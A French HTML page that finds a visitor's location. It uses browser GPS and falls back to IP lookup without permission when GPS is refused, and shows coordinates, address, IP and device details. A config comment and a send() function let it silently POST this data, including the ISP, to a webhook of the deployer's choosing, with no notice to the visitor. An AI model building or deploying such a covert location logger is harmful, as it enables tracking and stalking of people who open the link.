<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ma position</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body {
    margin:0; font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
    background:#0e1116; color:#e6edf3; display:flex; min-height:100vh;
    align-items:center; justify-content:center; padding:20px;
  }
  .card { width:100%; max-width:560px; background:#161b22; border:1px solid #262d36; border-radius:14px; padding:22px; }
  h1 { font-size:19px; margin:0 0 4px; }
  .sub { color:#8b949e; font-size:13px; margin-bottom:16px; }
  .row { display:flex; justify-content:space-between; gap:10px; padding:9px 0; border-bottom:1px solid #21262d; font-size:14px; }
  .row span:first-child { color:#8b949e; }
  .row span:last-child { text-align:right; word-break:break-word; }
  iframe { width:100%; height:260px; border:0; border-radius:10px; margin-top:14px; background:#0b0e13; }
  button { margin-top:14px; width:100%; padding:11px; border-radius:9px; border:1px solid #30363d;
           background:#21262d; color:#e6edf3; font-size:14px; cursor:pointer; }
  button:hover { background:#2a313a; }
  .ok { color:#3fb950; } .warn { color:#d29922; } .err { color:#f85149; }
</style>
</head>
<body>
<div class="card">
  <h1>Ta position</h1>
  <div class="sub" id="status">Demande d'autorisation...</div>

  <div class="row"><span>Source</span><span id="src">-</span></div>
  <div class="row"><span>Latitude</span><span id="lat">-</span></div>
  <div class="row"><span>Longitude</span><span id="lon">-</span></div>
  <div class="row"><span>Précision</span><span id="acc">-</span></div>
  <div class="row"><span>Ville / Pays</span><span id="place">-</span></div>
  <div class="row"><span>Adresse IP</span><span id="ip">-</span></div>
  <div class="row"><span>Appareil</span><span id="ua">-</span></div>

  <iframe id="map" loading="lazy" referrerpolicy="no-referrer"></iframe>
  <button id="copy">Copier le résultat</button>
</div>

<script>
/* ====== 1. CONFIG ====== */
// Colle ici l'URL d'un webhook pour recevoir la position automatiquement
// (webhook.site, Make, n8n, Zapier, ou ton propre serveur). Vide = affichage seul.
const WEBHOOK_URL = "";

/* ====== 2. OUTILS ====== */
const $ = id => document.getElementById(id);
const set = (id, v) => { $(id).textContent = v ?? '-'; };
const result = { source: null, timestamp: new Date().toISOString() };

function send(payload) {
  if (!WEBHOOK_URL) return;
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(() => {});
}

function showMap(lat, lon) {
  const d = 0.01;
  $('map').src = `https://www.openstreetmap.org/export/embed.html?bbox=${lon-d},${lat-d},${lon+d},${lat+d}&layer=mapnik&marker=${lat},${lon}`;
}

function finish() {
  result.userAgent = navigator.userAgent;
  result.language  = navigator.language;
  result.screen    = screen.width + 'x' + screen.height;
  result.timezone  = Intl.DateTimeFormat().resolvedOptions().timeZone;
  send(result);
}

/* ====== 3. GPS (précis, avec accord du visiteur) ====== */
function tryGPS() {
  if (!navigator.geolocation) return fallbackIP('GPS indisponible');

  navigator.geolocation.getCurrentPosition(
    pos => {
      const { latitude: lat, longitude: lon, accuracy } = pos.coords;
      $('status').innerHTML = '<span class="ok">Position GPS obtenue</span>';
      set('src', 'GPS (navigateur)');
      set('lat', lat.toFixed(6));
      set('lon', lon.toFixed(6));
      set('acc', '~' + Math.round(accuracy) + ' m');
      showMap(lat, lon);
      Object.assign(result, { source: 'gps', lat, lon, accuracy });
      reverse(lat, lon);
      finish();
    },
    () => fallbackIP('GPS refusé ou expiré'),
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

/* ====== 4. FALLBACK IP (imprécis, sans permission) ====== */
async function fallbackIP(raison) {
  $('status').innerHTML = `<span class="warn">${raison} → localisation par IP</span>`;
  try {
    const r = await fetch('https://ipwho.is/');
    const d = await r.json();
    if (!d.success) throw 0;

    set('src', 'Adresse IP (approximatif)');
    set('lat', d.latitude.toFixed(6));
    set('lon', d.longitude.toFixed(6));
    set('acc', 'ville / région');
    set('place', [d.city, d.region, d.country].filter(Boolean).join(', '));
    set('ip', d.ip);
    showMap(d.latitude, d.longitude);
    Object.assign(result, {
      source: 'ip', lat: d.latitude, lon: d.longitude, ip: d.ip,
      city: d.city, region: d.region, country: d.country,
      isp: d.connection && d.connection.isp
    });
  } catch {
    $('status').innerHTML = '<span class="err">Impossible de localiser</span>';
  }
  finish();
}

/* ====== 5. GÉOCODAGE INVERSE (adresse lisible) ====== */
async function reverse(lat, lon) {
  try {
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
    const d = await r.json();
    if (d.display_name) { set('place', d.display_name); result.address = d.display_name; }
  } catch {}
}

/* ====== 6. COPIE ====== */
$('copy').onclick = () => {
  const txt = Object.entries(result).map(([k, v]) => k + ': ' + v).join('\n');
  navigator.clipboard.writeText(txt).then(() => {
    $('copy').textContent = 'Copié !';
    setTimeout(() => $('copy').textContent = 'Copier le résultat', 1500);
  });
};

set('ua', navigator.userAgent.slice(0, 60) + '...');
tryGPS();
</script>
</body>
</html>
